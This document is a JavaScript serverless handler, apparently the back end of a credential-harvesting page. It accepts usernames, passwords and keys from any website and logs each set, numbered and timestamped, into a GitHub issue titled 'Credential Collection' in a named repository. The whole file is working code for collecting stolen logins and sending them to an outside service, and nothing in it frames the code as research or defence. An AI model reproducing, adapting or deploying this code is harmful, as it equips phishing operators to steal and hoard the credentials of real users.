// api/update-issue.js
const axios = require('axios');
module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  // Handle OPTIONS request (pre-flight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Make sure this is a POST request
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Access the GitHub token from environment variables
    const githubToken = process.env.GITHUB_TOKEN;
    
    if (!githubToken) {
      console.error('GitHub token is not defined in environment variables');
      return res.status(500).json({ error: 'Server configuration error' });
    }
    
    const { username, password, key } = req.body;
    
    // Your GitHub repository information
    const owner = 'ZA3MA3'; // Replace with your GitHub username
    const repo = 'progres'; // Replace with your repository name
    const issueTitle = "Credential Collection";
    
    // First, check if the issue already exists
    const issuesResponse = await axios.get(
      `https://api.github.com/repos/${owner}/${repo}/issues`,
      {
        headers: {
          'Authorization': `Bearer ${githubToken}`,
          'Accept': 'application/vnd.github.v3+json'
        },
        params: {
          state: 'open',
          creator: owner
        }
      }
    );
    
    // Look for our specific issue
    let existingIssue = issuesResponse.data.find(issue => issue.title === issueTitle);
    let response;
    
    if (existingIssue) {
      // Get current time for timestamp
      const timestamp = new Date().toISOString();
      
      // Get the existing issue to see the current body content
      const issueDetailsResponse = await axios.get(
        `https://api.github.com/repos/${owner}/${repo}/issues/${existingIssue.number}`,
        {
          headers: {
            'Authorization': `Bearer ${githubToken}`,
            'Accept': 'application/vnd.github.v3+json'
          }
        }
      );
      
      const currentBody = issueDetailsResponse.data.body;
      
      // Count existing credential sets to determine the next ID
      const credRegex = /creds(\d+):/g;
      let matches = [...currentBody.matchAll(credRegex)];
      let nextCredId = 1;
      
      if (matches.length > 0) {
        // Find the highest existing ID and increment by 1
        const highestId = Math.max(...matches.map(match => parseInt(match[1])));
        nextCredId = highestId + 1;
      }
      
      // Format the new credentials with an ID
      const newEntry = `\n\n## creds${nextCredId}: ${timestamp}\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`;
      
      // Update the existing issue with the new credentials appended
      response = await axios.patch(
        `https://api.github.com/repos/${owner}/${repo}/issues/${existingIssue.number}`,
        {
          body: currentBody + newEntry
        },
        {
          headers: {
            'Authorization': `Bearer ${githubToken}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json'
          }
        }
      );
      
    } else {
      // Create a new issue if none exists
      response = await axios.post(
        `https://api.github.com/repos/${owner}/${repo}/issues`,
        {
          title: issueTitle,
          body: `# Collected Credentials\n\n## creds1: ${new Date().toISOString()}\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`,
          labels: ["credentials"]
        },
        {
          headers: {
            'Authorization': `Bearer ${githubToken}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json'
          }
        }
      );
    }
    
    return res.status(200).json({ 
      success: true, 
      issueUrl: response.data.html_url,
      isNew: !existingIssue
    });
    
  } catch (error) {
    console.error('Error working with GitHub issue:', error.response?.data || error.message);
    return res.status(500).json({ error: 'Failed to process GitHub issue' });
  }
};
